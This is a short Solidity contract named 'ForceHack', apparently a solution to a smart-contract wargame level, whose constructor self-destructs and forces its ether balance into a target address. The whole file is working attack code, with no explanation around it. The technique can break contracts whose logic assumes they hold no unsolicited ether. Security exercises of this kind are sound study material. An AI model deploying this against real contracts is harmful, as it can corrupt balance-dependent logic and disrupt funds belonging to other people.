// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract ForceHack {
    constructor(address forceAddress) payable {
        selfdestruct(payable(forceAddress));
    }
}
